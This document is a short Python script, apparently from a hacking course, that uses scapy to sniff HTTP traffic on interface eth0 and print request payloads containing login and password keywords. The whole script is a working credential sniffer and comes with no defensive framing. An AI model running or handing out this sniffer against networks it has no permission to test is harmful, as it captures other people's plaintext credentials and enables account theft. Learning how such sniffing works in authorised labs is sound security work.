#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			user_keys = ["username", "UserName", "user", "login", "password", "pass"]

			for user_key in user_keys:
				if user_key in load:
					print(load)
					break


sniff("eth0")
